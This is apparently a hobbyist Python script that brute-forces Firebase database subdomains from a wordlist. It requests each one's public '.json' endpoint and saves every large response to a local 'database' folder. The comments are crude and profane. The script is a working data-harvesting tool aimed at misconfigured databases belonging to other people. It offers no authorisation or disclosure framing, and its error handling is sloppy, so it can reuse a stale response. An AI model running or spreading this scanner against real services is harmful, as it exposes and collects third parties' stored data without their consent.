import requests

print('If you dont have a word list yet you can create one by going to WLS folder and starting scraper.py or ofc you can create your own one wich is the most powerful method. ')
print('https://twitter.com/T0rCry')
print('Now just let the script load everythin. It will close its self when its done!')


# minimum amount of characters a database should have
RESPONSE_THRESHOLD = 1000 # You can basicly add any number here but if it's too small u migh't find a lot of useless databases!

# subdomain wordlist here! SUBDOMAIN! NOT DOMAIN! FUCKING DUMB ASS!
wordlist = "wordlist.txt"  # This fucking little line of code will define where to find the words that it looks for at firebaseio.com
# And yes. You do can change the worldlist name to what ever you want it to be but wouldn't it be a lot fucking easier to keep it as wordlist.txt? Also u can find the worldlist at the folder worldlist :)


# read word list from file
for line in open("wordlists/%s" % wordlist, "r").readlines():

	#prepares URL
	word = line.rstrip()
	url = "https://%s.firebaseio.com/.json" % word # Basicly it always get's a word from wordlist.txt and puts it to %s and if the firebaseio.com/.json has enough of characters it will add it to folder "databases"



	# request the database
	try:
		response = requests.get(url).text

	# in case the request fails, ignore
	except Exception as e:
		pass

	# I hope you already know what that thing does... I'm not going to explain it to you! 


	# only store if meets the size threshold
	if len(response) >= RESPONSE_THRESHOLD:

		with open("database/" + word, "w+") as file:
			file.write(response)
			
			print(url)

